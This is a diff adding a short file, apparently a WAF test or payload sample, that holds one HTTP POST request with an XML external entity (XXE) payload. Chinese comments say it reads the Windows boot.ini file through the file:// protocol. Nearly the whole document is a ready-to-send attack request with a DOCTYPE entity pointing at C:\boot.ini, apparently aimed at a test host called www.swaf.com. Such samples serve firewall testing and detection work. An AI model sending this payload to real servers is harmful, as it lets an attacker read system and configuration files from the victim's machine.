@@ -1,0 +1,15 @@
+# XML外部实体注入_文件读取_boot.ini
+# 攻击者通过构造此语句利用file协议可以读取windows系统上配置文件boot.ini
+POST /?bid=hd_tag_m8mv253m HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv253m
+RM-PRO-Token: 1ed384ee83f00f77b5ec6eb66ede8edf
+RM-PRO-Time: 1742808436481
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///C:\boot.ini">
+]>
+<x>&xxe;</x>
